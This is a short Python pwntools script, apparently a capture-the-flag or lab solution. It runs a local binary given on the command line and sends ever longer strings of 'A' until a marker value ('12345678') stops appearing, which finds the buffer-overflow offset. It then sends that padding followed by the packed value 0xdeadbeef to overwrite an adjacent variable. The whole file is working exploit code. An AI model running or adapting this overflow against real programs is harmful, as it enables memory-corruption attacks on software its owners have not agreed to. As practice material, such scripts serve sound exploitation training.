from pwn import *
import sys

ELF_FILE = sys.argv[1]

def loop(elf_file):
    io = process(str(elf_file))
    i = 1
    io.sendlineafter(b'?', b'A' * i)
    result = io.recvall().decode()
    print(result)
    while '12345678' in result:
        io = process(str(elf_file))
        i += 1
        io.sendlineafter(b'?', b'A' * i)
        result = io.recvall().decode()
        print(result)
    print('Done with ' + str(i) + ' bytes')
    io = process(str(elf_file))
    io.sendlineafter(b'?', b'A' * i + p32(0xdeadbeef))
    print(io.recvall().decode())
loop(ELF_FILE)